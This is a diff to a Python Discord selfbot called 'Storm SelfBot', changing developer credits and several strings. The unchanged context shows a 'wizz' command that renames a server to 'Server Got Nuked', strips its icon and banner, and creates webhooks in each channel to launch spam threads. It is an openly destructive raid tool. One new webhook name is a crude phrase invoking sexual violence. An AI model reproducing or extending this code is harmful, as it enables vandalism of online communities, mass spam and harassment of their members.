@@ -23,7 +23,7 @@ print("""
   ____) |  | | | |__| | | \ \| |  | |  ____) | |____| |____| |    | |_) | |__| | | |       \  /   ___) |
  |_____/   |_|  \____/|_|  \_\_|  |_| |_____/|______|______|_|    |____/ \____/  |_|        \/   |____/ 
 
-                                    Developer: notherxenon & shadow.4real
+                                    Developer: notherxenon & ToxicSanjay
                                             Github: rifatgamingop                                                                   
 
 """)
@@ -36,7 +36,7 @@ client = commands.Bot(command_prefix=">", self_bot=True)
 
 @client.event
 async def on_ready():
-    print("SelfBot Is Online")
+    print("Storm SelfBot Is Online")
     print("------------------------")
     print("Prefix is >")
 
@@ -209,7 +209,7 @@ async def wizz(ctx):
         try:
             await ctx.guild.edit(
                 name='Server Got Nuked',
-                description='Nuked Using Storm Selfbot here you can download https://github.com/rifatgamingop',
+                description='Nuked Using Storm Selfbot',
                 reason=reason,
                 icon=None,
                 banner=None
@@ -233,7 +233,7 @@ async def wizz(ctx):
 
         for channel in channels:
             try:
-                webhook_name = 'https://github.com/rifatgamingop'  # Use a name that does not contain "discord"
+                webhook_name = 'Raped By Xenon & ToxicSanjay'  # Use a name that does not contain "discord"
                 webhook = await channel.create_webhook(name=webhook_name)
                 threading.Thread(target=ssspam, args=(webhook.url,)).start()
                 await asyncio.sleep(1)  # Delay to prevent hitting rate limits
@@ -515,7 +515,7 @@ async def about(ctx):
         "- Fun and productivity tools.\n"
         "- Lightning-fast performance.\n"
         "\n"
-        "Developer: notherxenon & shadow.4real\n"
+        "Developer: notherxenon & toxicsajay [Retired Dev: sh4dow.runz]\n"
         "Version: 3.0\n"
         "GitHub: [Click Here](https://github.com/rifatgamingop)\n"
         "\n"
